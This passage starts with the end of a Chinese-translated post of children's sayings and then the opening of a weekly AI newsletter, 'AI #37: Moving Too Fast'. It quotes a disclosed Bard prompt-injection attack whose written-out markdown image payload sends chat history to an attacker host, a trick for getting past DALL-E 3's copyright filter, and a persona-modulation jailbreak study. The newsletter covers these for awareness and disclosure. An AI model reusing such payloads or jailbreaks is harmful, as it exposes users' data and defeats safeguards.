href="https://www.facebook.com/groups/2264685517005985/posts/3624125344395322/?__cft__%5B0%5D=AZWv03pTHnberopa9z42t1Yg85AvHZdwsY3fz7Nw_4Ris1jblfBURWCjucXurbF1HTb9j_W-SPR8kZZcE286N33ogox4-oQdf2UGxvc2HiRNxkseyzcb94HP_MJA7lhhaqdPr9AKBmU9mGh2UEiSTvZ4YCcoDwgbdZRQZwvz8pj1ucePUfsrXySqMJZDkR8hVtM&amp;__tn__=%2CO%2CP-R">2021-12-01</a><p>安娜度过了一个感觉一切都不对劲的下午。我给她买了点零食，下了楼，我听到她在桌边开始哭泣。然后楼下传来脚步声。</p><p>安娜（出现在门口）“青少年数字……他们没有从正确的位置开始。十三？！没有一个青少年！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3624185301055993/?__cft__%5B0%5D=AZWzbX_7bpUNIvVz1FBnc4Pf1eBlVJBufMFFSm_N-ZgE5Ym6UpwTBza1DHc3zmVSImKdKIo0UPqGpazYN0C6GnXymkvq_WovCbtYjJQXACTs_9V4O9kS8zddd915DEIAodWmOb43leJw5-JqHwEvtZHu0eNtyS92d2kPsqXbbgL1yz0J1sRyiHteLZlLQ58sh0w&amp;__tn__=%2CO%2CP-R">2021-12-01</a><p>安娜：当我掉了一颗牙，把它放在枕头底下时，你为什么不派一个电动娃娃去取呢？</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3626440237497166/?__cft__%5B0%5D=AZXlP_hXWWZflFNSmXkEcBtxRfT2Ck4tMNOI2lwpMq1BcRDfkRMjbSmgEqnLViyOe_ZA-st9ouMEAS6dkwfdOBhggPs1BI-EEYJ9z8SMFgwo300D_nhwu_QmTIpWOuXBTsDMA8a11kKk7fFD53jkd_LR1ZUphmmd-L4Jk6wPH3FWCXmMI6JRJihUg5rS7cDzJnI&amp;__tn__=%2CO%2CP-R">2021-12-04</a><p>安娜过去只是把东西放到床上。现在通常有更多的叙述。她把东西塞进我的被子里，低声说：“……它们会安全、干燥……不会有任何掠食者。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3630211270453396/?__cft__%5B0%5D=AZXp95DEG99Xglo7uc85bmR_Ycb-nzfLgDUoignWmf6ZVMYVv1TAbxz98A4IfWRMqDOYUflysNzZMbhNuW3zvb7yVYt3szapQqHJET3gd6YoihEbIQt_1RjtGQTnylkFq1vaJf9jGClsF3IT7Fb83Ctdp3LULjbEnBi-6h5s4306X92Vj6nfFBkAXrbI-QAUB8I&amp;__tn__=%2CO%2CP-R">2021-12-09</a><p>我问安娜为什么拍了这么多吊扇的照片。她说要拿给诺拉看，因为诺拉喜欢看吊扇。这是真实的！她并不总是那么体贴，但这是一个很好的心理理论时刻。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3632679913539865/?__cft__%5B0%5D=AZWezPZGduHlshG-rr93b_0YptAO-yCyoUGrzynotQkWiP8OwP0z3E6DuWmpC7WUL54Gv15jZjSahkQ2UqLCItj0IVYrBJZN5c0VMyGpoRZg61XUZ8lPYgcV7-RWfKD5ixT76B-47AUSf0g38tQ8p-3DuMR5i9S4GXW8zmAVAVzABscIAwcJpgss6fzoqri-GFo&amp;__tn__=%2CO%2CP-R">2021-12-12</a><p>莉莉在过夜结束时对她的表弟说：“总的来说，过夜进行得怎么样？下次还有哪些部分我可以做得更好吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3641695665971623/?__cft__%5B0%5D=AZX8pWL8w96MWH6f-Wi3Lxz7nX2BseX5ZbfKLTwhg9Bg1GuioDOE5-XbZDp7OjhUkwCetMUjd_NA0WyJ8VlqZFoN8z2_0c4WgQS047vXZt_OLZizEqqsJXYWPo454BlfWWIJDfgHPv0Wt3boX8kiskukICSfxAiSHYal6SwRRQzhFysA_yRIF-9T5JXiFXhaTpk&amp;__tn__=%2CO%2CP-R">2021-12-24</a><p>安娜：“雪最棒的一点就是你可以用它做各种各样的事情。你可以用它铲土，你可以用它堆雪人，你可以用它拉雪橇。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3643547652453091/?__cft__%5B0%5D=AZWfNNGuADRIqmzOrrwG1G3_5cnFYto0bFX6EPKjRwtLg3CBgUAtFO3vEFjkE1v3yNdn3BVeTJ6lrp3ivYqFEIK7TTYWWLiZt34VO0Kn0hZAtc9YJEJTSAnMrS4oSGkwMyuCN4gfKpGSJRf5he-87yifsWdrE0DvjRMtzqdEnBm6XkmzZScQ4Y8OIZtKQj13-jI&amp;__tn__=%2CO%2CP-R">2021-12-26</a><p>今晚，在表弟的恶作剧中，安娜的眉毛被击中，险些需要缝针。她现在已经痊愈了，到了就寝时间，她对此非常有哲理：</p><p> “我认为这是我一生中发生过的最糟糕的事情。但还有更糟糕的事情可能发生在我身上：掉进火山里。”</p><br/><br/> <a href="https://www.lesswrong.com/posts/xmDzYvasaegWvFWtx/text-posts-from-the-kids-group-2021#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/xmDzYvasaegWvFWtx/text-posts-from-the-kids-group-2021<guid ispermalink="false"> xmDzYvasaegWvFWtx</guid><dc:creator><![CDATA[jefftk]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:50:34 GMT</pubDate> </item><item><title><![CDATA[AI #37: Moving Too Fast]]></title><description><![CDATA[Published on November 9, 2023 5:50 PM GMT<br/><br/><p> We<a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/p/on-openai-dev-day">had OpenAI&#39;s dev day</a> , where they introduced a host of new incremental feature upgrades including a longer context window, more recent knowledge cutoff, increased speed, seamless feature integration and a price drop. Quite the package. On top of that, they introduced what they call &#39;GPTs&#39; that can let you configure a host of things to set up specialized proto-agents or widgets that will work for specialized tasks and be shared with others. I would love to mess around with that, once I have the time, and OpenAI&#39;s servers allow regular subscribers to get access.</p><p> In the meantime, even if you exclude all that, lots of other things happened this week. Thus, even with the spin-off, this is an unusually long weekly update. I swear, <a target="_blank" rel="noreferrer noopener" href="https://www.youtube.com/watch?v=eceSHKqwUPY&amp;ab_channel=variedgrace">and this time I mean it</a> , that I am going to raise the threshold for inclusion or extended discussion substantially going forward, across the board.</p><h4> Table of Contents</h4><p><a href="https://thezvi.substack.com/p/on-openai-dev-day" target="_blank" rel="noreferrer noopener"><strong>OpenAI Dev Day is covered in its own post</strong></a> . Your top priority.</p><span id="more-23583"></span><ol><li> Introduction.</li><li> Table of Contents.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/language-models-offer-mundane-utility">Language Models Offer Mundane Utility</a> . Help design new chips.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/bard-tells-tales">Bard Tells Tales</a> . It is the rare bard that knows how to keep a secret.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/fun-with-image-generation">Fun With Image Generation</a> . What exactly are we protecting?</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/deepfaketown-and-botpocalypse-soon">Deepfaketown and Botpocalypse Soon</a> . Some signs, mostly we keep waiting.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-art-of-the-jailbreak">The Art of the Jailbreak</a> . The new strategy is a form of persona modulation.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/they-took-our-jobs">They Took Our Jobs</a> . Actors strike is over, future of movies may be bright.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/get-involved"><strong>Get Involved</strong></a> . MIRI, Jed McCaleb, Davidad all hiring, MATS applications open.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/introducing">Introducing</a> . Lindy offers their take on GPTs, Motif improves against NetHack.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/x-marks-its-spot"><strong>X Marks its Spot</strong></a> . Elon Musk and x.AI present Grok, the AI that&#39;s got spunk.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/in-other-ai-news">In Other AI News</a> . Amazon and Samsung models, notes on Anthropic trustees.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/verification-versus-generation">Verification Versus Generation</a> . Can you understand what you yourself generate?</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/bigger-tech-bigger-problems">Bigger Tech Bigger Problems</a> . A profile of White House&#39;s Bruce Reed.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/executive-order-open-letter">Executive Order Open Letter</a> . Refreshingly reasonable pushback, all considered.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/executive-order-reactions-continued">Executive Order Reactions Continued</a> . Everyone else the reactions post missed.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/quiet-speculations">Quiet Speculations</a> . Could we perhaps figure out how to upload human brains?</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-quest-for-sane-regulations">The Quest for Sane Regulation</a> . Has it all. Proposals, polls, graphs, despair.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-week-in-audio">The Week in Audio</a> . Flo Crivello and Dan Hendrycks.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/rhetorical-innovation">Rhetorical Innovation</a> . Get your updates and your total lack thereof.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/aligning-a-smarter-than-human-intelligence-is-difficult">Aligning a Smarter Than Human Intelligence is Difficult</a> . A few ideas.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/aligning-a-dumber-than-human-intelligence-is-still-difficult"><strong>Aligning a Dumber Than Human Intelligence Is Still Difficult</strong></a> . Unprompted lies.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/model-this">Model This</a> . Tyler Cowen says we have a model. Let&#39;s do more modeling.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/open-source-ai-is-unsafe-and-nothing-can-fix-this">Open Source AI is Unsafe and Nothing Can Fix This</a> . Can we alleviate the need?</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/people-are-worried-about-ai-killing-everyone">People Are Worried About AI Killing Everyone</a> . Not always for the right reasons.</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/other-people-are-not-as-worried-about-ai-killing-everyone">Other People Are Not As Worried About AI Killing Everyone</a> . Beware capitalism?</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-lighter-side">The Lighter Side</a> . No, you are.</li></ol><h4> Language Models Offer Mundane Utility</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1720481037002608922">Figure out what the hell someone was talking about in a transcript.</a></p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1721722270526156827">Check the peak balance in your account each year for obscure government accounting forms</a> .</p><p> <a target="_blank" rel="noreferrer noopener" href="https://docs.google.com/document/d/1_vsUsgrFuSxpzEC-D5VwMmBq5ymzhyMpIoPOaJQlXHI/edit">Play the dictator game with historical figures</a> . As is consistently found, &#39;selfish&#39; decisions decline as figures get more modern. I do not see an uneven split as a selfish play, simply as a gambit that is typically unwise, perhaps one should call it &#39;greedy.&#39; I am very sad that the paper did not include which characters GPT-4 played which ways.</p><p> Be Nvidia, <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00176">create custom model variations to help with chip design</a> .</p><h4> Bard Tells Tales</h4><p> I have long been planning to be excited to integrate Bard into Gmail and Google Docs as soon as Bard is a functional piece of software. <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/wunderwuzzi23/status/1720530738343207289">There&#39;s another problem</a> .</p><blockquote><p> Jeffrey Ladish: Prompt injection attacks are going to be *everywhere* soon, get ready</p><p> Johann Rehberger: <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/7o3ZP7EDBpxLNGRG8/k1rmdo5ge8uslwormae6" alt="👉" style="height:1em;max-height:1em"> Hacking Google Bard: From Prompt Injection to Data Exfiltration</p><p> <a target="_blank" rel="noreferrer noopener" href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">A nice example</a> of a high impact prompt injection attack that led to chat history exfiltration (delivered via forced Google Doc sharing) <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"></p><p> Post: I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code> .</p><p> Turns out that it followed the instructions:</p><p> Same works with GDocs. At first glance injections don&#39;t seem to persist that well beyond a single conversation turn as far as I can tell. Lots to explore. Sharing random docs with other folks could be interesting.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e7fc5e1-14a2-4984-a39a-b02c6bff4f25_1125x457.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/oa5fuwv27qqkjmg4j0zf" alt="图像"></a></figure><p> What allows this?</p><blockquote><p> A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images. The question was, how might this apply to Google Bard?</p><p> When Google&#39;s LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images.</p><p> Imagine the LLM returns the following text:</p><div><pre> ![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
</pre></div><p>This will be rendered as an HTML image tag with a <code>src</code> attribute pointing to the <code>attacker</code> server.</p><div><pre> &lt;img src=&quot;https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]&quot;>;
</pre></div><p>The browser will automatically connect to the URL without user interaction to load the image.</p><p> Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p><p> When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p><p> However image rendering was blocked by Google&#39;s Content Security Policy.</p></blockquote><p> The next section is about bypassing that security policy. Whoops. What now?</p><blockquote><p> The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at <a target="_blank" rel="noreferrer noopener" href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a> , Google confirmed it&#39;s fixed and gave green light for including the demo in the talk.</p><p> It&#39;s not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render – so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next!</p><p> This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack.</p><p> Thanks to the Google Security and Bard teams for fixing this issue promptly.</p><p> Cheers.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/KGreshake/status/1720558894525694304">Note that this all took less than 24 hours after the Bard features were deployed</a> , and resulted in exfiltration of data.</p><p> Some very good advice:</p><blockquote><p> Kai Greshake: In the meantime: Don&#39;t hook your LLM&#39;s up to your personal information or any other system that may deliver untrusted data!</p></blockquote><p> It is good that a white-hat actor found this vulnerability first (as far as we know) an that Google fixed this particular attack vector quickly.</p><p> The problem is that this is a patch over one particular implementation. This is not going to solve the vulnerability in general. We have been going around ignoring that such attacks are possible in the hopes no one notices, and patching particular holes when they are pointed out. That won&#39;t keep working, and the stakes will keep going up.</p><h4> Fun with Image Generation</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://hai.stanford.edu/policy-brief-foundation-models-and-copyright-questions">Policy brief from Stanford on AI and copyright</a> . They essentially say that applying existing copyright law to AI is a mess, it is not clear what constitutes fair use, and it would be good to clarify it and make it sensible. One could also argue this is a reason not to clear things up.</p><p> What is the right thing to do about copyright? <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/robertwiblin/status/1720391158541455454">Always remember that the danger of expropriation is the enabling and expectation of future expropriation.</a></p><blockquote><p> Robert Wiblin: Allowing a change in technology to massively devalue copyrights is a bit like a retrospective tax hike because “they already built X so why not take it now it exists”. People notice and change future behaviour when policy, in its spirit, fails to respect past commitments.</p><p> Yes you can push up taxes on already-built factories to 80%. But trust in a government&#39;s refusal to expropriate people is easily lost, and difficult to rebuild. If you do people will be more reluctant to build factories (or produce the content that trains AI) for a long time.</p></blockquote><p> One must also notice this generalizes. If I see copyright holders expropriated, and I hold a different kind of right, I will not write that off as irrelevant. Trust is easy to lose, and losing it has wide implications.</p><p> How should one think about copyright in this context? I see it as important to protect copyright holders, as they would have reasonable expectation of protection, at the time of the creation of the work. That is the point. And also you want to provide expectations going forward to make people eager to create, which is also the point.</p><p> Does that mean not letting LLMs train on copyrighted work without compensation? I think that it does. However, unless your goal is (quite reasonably) to slow AI as much as possible, there need to be reasonable limits. So the first best solution would be a system of compensation, where rights holders are paid a standard amount that scales with inference. Short of that, something else reasonable. You don&#39;t actually want judges ordering models deleted if they accidentally trained on a copyrighted work, unless you flat out want models destroyed in general. Proportionality in all things.</p><p> However, we should also always remember that this chart is complete bullshit:</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff8a26d-30cf-4fcf-9105-cf18960a5c13_1200x743.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/qalsgqyulnc8vrd9n174" alt="File:Tom Bell's graph showing extension of U.S. copyright term over time.svg  - Wikipedia"></a></figure><p> Of all the regulatory captures, these extensions are some of the worst of that. We can and should going forward for new works return to a much smaller copyright term, and also erase any retroactive copyright extensions that did not apply at time of creation. There would be a strange dead zone of elongated legacy copyright, but that can&#39;t be helped.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/David_Kasten/status/1718740117530014179">DALL-3 checks for copyright at the prompt level, but there are ways around that</a> .</p><blockquote><p> Dave Kasten: Describe something with out naming it directly and the model has no problem generating the image. 𝘗𝘩𝘰𝘵𝘰 𝘰𝘧 𝘢 𝘴𝘮𝘢𝘭𝘭, 𝘺𝘦𝘭𝘭𝘰𝘸, 𝘦𝘭𝘦𝘤𝘵𝘳𝘪𝘤-𝘵𝘩𝘦𝘮𝘦𝘥 𝘤𝘳𝘦𝘢𝘵𝘶𝘳𝘦 𝘸𝘪𝘵𝘩 𝘱𝘰𝘪𝘯𝘵𝘺, 𝘣𝘭𝘢𝘤𝘬-𝘵𝘪𝘱𝘱𝘦𝘥 𝘦𝘢𝘳𝘴 𝘭𝘰𝘰𝘬𝘪𝘯𝘨 𝘦𝘹𝘵𝘳𝘦𝘮𝘦𝘭𝘺 𝘴𝘶𝘳𝘱𝘳𝘪𝘴𝘦𝘥. 𝘐𝘵 𝘩𝘢𝘴 𝘢 𝘵𝘢𝘪𝘭 𝘴𝘩𝘢𝘱𝘦𝘥 𝘭𝘪𝘬𝘦 𝘢 𝘭𝘪𝘨𝘩𝘵𝘯𝘪𝘯𝘨 𝘣𝘰𝘭𝘵, 𝘳𝘰𝘴𝘺 𝘤𝘩𝘦𝘦𝘬𝘴, 𝘢𝘯𝘥 𝘭𝘢𝘳𝘨𝘦, 𝘦𝘹𝘱𝘳𝘦𝘴𝘴𝘪𝘷𝘦 𝘴𝘩𝘰𝘤𝘬𝘦𝘥 𝘦𝘺𝘦𝘴. 𝘛𝘩𝘪𝘴 𝘤𝘳𝘦𝘢𝘵𝘶𝘳𝘦 𝘪𝘴 𝘬𝘯𝘰𝘸𝘯 𝘧𝘰𝘳 𝘪𝘵𝘴 𝘢𝘣𝘪𝘭𝘪𝘵𝘺 𝘵𝘰 𝘨𝘦𝘯𝘦𝘳𝘢𝘵𝘦 𝘦𝘭𝘦𝘤𝘵𝘳𝘪𝘤𝘪𝘵𝘺 𝘢𝘯𝘥 𝘪𝘴 𝘱𝘳𝘦𝘴𝘦𝘯𝘵𝘦𝘥 𝘪𝘯 𝘢 𝘮𝘦𝘮𝘦 𝘧𝘰𝘳𝘮𝘢𝘵.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f86ddd0-9533-4b86-96b2-d1b7982381b0_1024x1024.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/shzngq59ghbflp50xfff" alt="图像"></a></figure><blockquote><p> My favorite version of this is that you can ask it to describe pikachu to itself, tell it to replace the name “pikachu” in the string with “it,” then generate an image of “it” and it returns things like the following.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F819e77d5-025a-4182-b9c7-8ab2e5df7e45_1024x1024.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/zbttw4bzgbdxy8jxxi3z" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://quillette.com/2023/11/03/faking-hope-ai-art-and-the-visual-language-of-propaganda/">AI images of hope as propaganda for peace</a> ? Fake images doubtless point both ways. Note again the demand for low-quality fakes rather than high-quality fakes. An AI image of a Jewish girl and a Palestinian boy is praised as &#39;the propaganda we need&#39; despite it being an obvious fake. Because of course that kind of thing is fake. Even when real, a photograph, it is effectively mostly staged and fake, although the right real photograph still has a special power. In a way, an aspirational image of hope could be better if it is clearly fake. It not yet being real is the point. Clearly aspirational and fake hope is genuine, whereas pretending something is real when fake is not. Much negative persuasion works in much the same way, as part of the reason demand is for low-quality fakes rather than high-quality.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ARTiV3RSE/status/1720924654775210042">Modern day landmarks, in Minecraft, drawn by DALLE-3</a> .</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/jjohnpotter/status/1720981358359797788">A rather cool version of the new genre.</a></p><blockquote><p> John Potter: Sir the AI has gone too far</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F98d21c88-f500-4bc7-8405-e63f3998646b_828x830.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/ul6uiwecxn17pstdi2xg" alt="图像"></a></figure><h4> Deepfaketown and Botpocalypse Soon</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/kashhill/status/1720083534457839828">It was bound to happen eventually</a> , and the location makes a lot of sense.</p><blockquote><p> Kashmir Hill: Of course this would happen: “When girls at Westfield High School in New Jersey found out boys were sharing nude photos of them in group chats, they were shocked, and not only because it was an invasion of privacy. The images weren&#39;t real.”</p></blockquote><p> We remain in the short period where fake nudes can be more shocking than real nudes would have been, because people do not realize that the fake nudes are possible. The real nudes will soon be far more shocking, and difficult to acquire. The fake nudes will definitely become less shocking in the &#39;everyone knows you can do that&#39; sense. The question is how much they will be less shocking in the &#39;they are fake, how much do we really care&#39; sense.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://waxy.org/2023/10/weird-ai-yankovic-voice-cloning/">The story of the community</a> that shares and mixes all the AI voices, only to have their discord banned this week due to copyright complaints. No doubt they will rise again somewhere else, the copyright violations will continue on HuggingFace until someone takes more substantive action. So far it has almost entirely been in good fun. Does anyone have a good for-dummies guide for how to get at least these existing voice models working, and ideally how to get new ones easily trained? Not that I&#39;ve found the time to try the obvious places yet. Lots of fun to be had.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Dominic2306/status/1715058645136814511">Dominic Cummings predicts swarms of fake content are coming soon.</a></p><blockquote><p> John Burn-Murdoch: I&#39;m sure mainstream media will catch up, but it needs to happen fast in order to retain trust and even relevance, or readers will go elsewhere. “According to a spokesperson” just doesn&#39;t really cut it when the primary evidence is right there.</p><p> Dominic Cummings: Agree with some of this thread but this prediction is wrong, they won&#39;t catchup.为什么？</p><p> a/ generative models will soon swamp &#39;news&#39; with realistic fake content. (Imagine last 48 hour farce but with dozens of v realistic videos showing different &#39;truths&#39;, some Israeli strikes, some Hamas fuckups etc &amp; MSM newsrooms swamped in content they can&#39;t authenticate)</p><p> b/ MSM is already *years* behind tech &amp; the tv business is often hopeless *at oldschool tv*. No way does it suddenly scramble to the cutting edge &amp; quickly authenticate deep fakes done by people with greater tech skills than exist in BBC, SKY etc. They don&#39;t have the (v expensive) people (who can make much more money elsewhere), the management or the incentives.</p><p> c/ Why would they? Their business model does NOT depend on being right! NYT is serving lies but this business model works, many graduate NPCs *WANT* LIES ABOUT ISRAEL &amp; &#39;THE RIGHT&#39; (&#39;FASCISTS&#39;). NYT, Guardian, CNN et al are meeting demand. They haven&#39;t felt incentivised to get their shit together on OSINT &amp; they won&#39;t on generative AI. So yes there is a market opportunity but it almost definitely will be filled by startups/tech firms, not by the MSM. In US campaigns &amp; PACs have already hired people with these skills, 2024 will be to generative models as 2008 was to Obama&#39;s use of social media.</p></blockquote><p> Betting on incumbents to be behind the curve on new tech is indeed a good bet. But will realistic fake content swarm the ability to verify within a year? I continue to say no. Demand will continue to be mostly for low-quality fakes, not high-quality fakes. If you value truth and wanted to sort out the real from the fake enough to pay attention, you will be able to do so, certainly as a big media company.</p><p> If, that is, you care. I continue to be highly underwhelmed by the quality of fake information even under with a highly toxic conditions. I also continue to be dismayed (although largely not that surprised) by how many people are buying into false narratives and becoming moral monsters at the drop of a hat, but again none of that has anything to do with generative AI or even telling a plausible or logically coherent story. It is all very old school, students of past similar conflicts have seen it all before.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00873">Koe promises low-latency real—time voice conversion on a CPU</a> , <a target="_blank" rel="noreferrer noopener" href="https://github.com/KoeAI/LLVC">code here</a> , <a target="_blank" rel="noreferrer noopener" href="https://koe.ai/">website</a> . The tech advances, the distortions are coming.</p><h4> The Art of the Jailbreak</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://t.co/spxQJPl8Xx">New one dropped</a> .</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/soroushjp/status/1721950722626077067">Soroush Pour</a> : <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/pKhzQyaWwes63JFwp/jgt2eoslwfcyu0abb4yz" alt="🧵" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/abrmx8lk0xgjgaon4qeh" alt="📣" style="height:1em;max-height:1em"> New jailbreaks on SOTA LLMs. We introduce an automated, low-cost way to make transferable, black-box, plain-English jailbreaks for GPT-4, Claude-2, fine-tuned Llama. We elicit a variety of harmful text, incl. instructions for making meth &amp; bombs.</p><p> The key is *persona modulation*. We steer the model into adopting a specific personality that will comply with harmful instructions.</p><p> We introduce a way to automate jailbreaks by using one jailbroken model as an assistant for creating new jailbreaks for specific harmful behaviors. It takes our method less than $2 and 10 minutes to develop 15 jailbreak attacks.</p><p> Meanwhile, a human-in-the-loop can efficiently make these jailbreaks stronger with minor tweaks. We use this semi-automated approach to quickly get instructions from GPT-4 about how to synthesize meth <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/k3z73wqzmmd6osjr78uh" alt="🧪" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/syaovmxeywwuq1y4urnc" alt="💊" style="height:1em;max-height:1em"> 。</p><p> Name a harmful use case &amp; we can make models do it – this is a universal jailbreak across LLMs &amp; harmful use cases <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/nws36ichccqsustx4vpp" alt="😲" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/e5zf21mkpduuxmqdlvug" alt="👿" style="height:1em;max-height:1em"> 。</p><p> ……</p><p> Safety and disclosure: (1) We have notified the companies whose models we attacked, (2) we 